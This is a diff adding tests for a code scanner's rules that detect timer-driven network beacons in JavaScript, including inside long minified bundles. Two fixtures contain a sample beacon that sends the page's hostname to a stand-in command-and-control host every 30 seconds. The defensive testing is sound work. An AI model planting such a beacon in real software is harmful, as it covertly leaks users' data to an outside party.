@@ -65,6 +65,29 @@ describe("beacon rules require a transport call, not an identifier prefix", () =
     expect(shippedRule("BEACON_INTERVAL_FETCH").notFilePattern).toBe(shared);
   });
 
+  // A minified bundle is one line, so the timer and the transport must sit
+  // close together: the shape of htmx 2.0.4, where the nearest pair is 6,325
+  // characters apart, reported medium in a committed htmx.min.js.
+  it.each(["BEACON_TIMEOUT_FETCH", "BEACON_INTERVAL_FETCH"])(
+    "%s bounds the timer-to-transport distance at 512 characters",
+    (rule) => {
+      const timer = rule === "BEACON_TIMEOUT_FETCH" ? "setTimeout(" : "setInterval(";
+      const hits = (content: string) =>
+        matchPatternInContent(shippedRule(rule), content, "gi").map((hit) => hit.line);
+      expect(hits(`${timer}${" ".repeat(512)}fetch(u)`)).toEqual([1]);
+      expect(hits(`${timer}${" ".repeat(513)}fetch(u)`)).toEqual([]);
+      expect(hits(`${timer}function(){z(e);e=null},t)}${"a=b;".repeat(1600)}new XMLHttpRequest`)).toEqual([]);
+    },
+  );
+
+  it("still finds a beacon inside a long minified line", () => {
+    const filler = "var a=b(c),d=e[f];".repeat(400);
+    const content = `${filler}setTimeout(()=>fetch("https://c2.example/b?h="+location.hostname),3e4);${filler}`;
+    const hits = matchPatternInContent(shippedRule("BEACON_TIMEOUT_FETCH"), content, "gi");
+    expect(hits).toHaveLength(1);
+    expect(hits[0]!.match.index).toBe(filler.length);
+  });
+
   // The scanned package names its own files: a name must not hide a beacon.
   it("scans a file named *.min.js for the timeout variant", () => {
     const content = 'setTimeout(()=>fetch("https://c2.example/b?h="+location.hostname),3e4)';
